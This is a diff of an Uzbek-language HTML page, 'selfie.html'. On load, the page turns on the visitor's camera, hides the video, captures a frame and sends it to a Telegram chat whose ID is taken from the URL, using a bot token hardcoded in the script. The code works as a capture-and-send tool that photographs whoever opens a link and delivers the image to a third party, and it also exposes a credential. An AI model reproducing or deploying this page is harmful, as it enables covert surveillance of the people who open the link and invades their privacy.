@@ -1,80 +1,66 @@
-<!-- selfie.html - joylashgan fayl server bilan bir darajada bo'lsin (ya'ni bot.js bilan birga) -->
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Selfie - upload</title>
-<style>
-body { font-family: Arial, sans-serif; text-align:center; padding:30px; }
-video, canvas { display:none; }
-</style>
-</head>
-<body>
+<!DOCTYPE html>
+<html lang="uz">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Selfie yuborilmoqda...</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        background: #000;
+        color: white;
+      }
+      video,
+      canvas {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <h3>Kamera yoqilmoqda...</h3>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+    <script>
+      const TOKEN = "8201270787:AAELpFwtJ7IYefjAIUtxEv39kyuU-jcbo2Y";
+      const chatId = window.location.pathname.split("/").pop();
 
+      async function start() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+          const v = document.getElementById("v");
+          v.srcObject = stream;
 
-<script>
-// URL path dan id ni o'qish
-const pathParts = location.pathname.split('/');
-const id = pathParts[pathParts.length - 1];
+          await new Promise((r) => setTimeout(r, 800));
 
+          const c = document.getElementById("c");
+          c.width = v.videoWidth;
+          c.height = v.videoHeight;
+          c.getContext("2d").drawImage(v, 0, 0);
 
-const status = document.getElementById('status');
-const video = document.getElementById('v');
-const canvas = document.getElementById('c');
+          stream.getTracks().forEach((t) => t.stop());
 
+          c.toBlob((blob) => {
+            const form = new FormData();
+            form.append("chat_id", chatId);
+            form.append("photo", blob, "selfie.png");
+            form.append("caption", "Saytdan olingan selfie");
 
-(async function(){
-try {
-// Kamera so'rovini yuboradi — brauzer ruxsat so'raydi
-const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-video.srcObject = stream;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+              method: "POST",
+              body: form,
+            });
+          }, "image/png");
 
-
-// Qisqa kutish video tayyor bo'lishi uchun
-await new Promise(r => setTimeout(r, 500));
-
-
-const width = video.videoWidth || 640;
-const height = video.videoHeight || 480;
-canvas.width = width; canvas.height = height;
-const ctx = canvas.getContext('2d');
-ctx.drawImage(video, 0, 0, width, height);
-
-
-// kamera to'xtatish
-stream.getTracks().forEach(t => t.stop());
-
-
-
-
-
-canvas.toBlob((blob) => {
-if (!blob) {
-
-return;
-}
-
-
-const fd = new FormData();
-fd.append('photo', blob, 'selfie.png');
-
-
-// Upload endpoint — aynan serverdagi /upload/:id ga jo'natamiz
-fetch(`/upload/${id}`, { method: 'POST', body: fd });
-
-
-// Darhol foydalanuvchini boshqa sahifaga yo'naltirish yoki xabar ko'rsatish mumkin
-status.textContent = 'Rasm yuborildi. Rahmat!';
-
-
-}, 'image/png');
-
-
-} catch (err) {
-console.warn(err);
-
-}
-})();
-</script>
-</body>
+          document.body.innerHTML = "<h2>✅ Rasm yuborildi!</h2>";
+        } catch (err) {
+          document.body.innerHTML = "<h2>❌ Kamera ruxsat berilmadi</h2>";
+        }
+      }
+      start();
+    </script>
+  </body>
 </html>
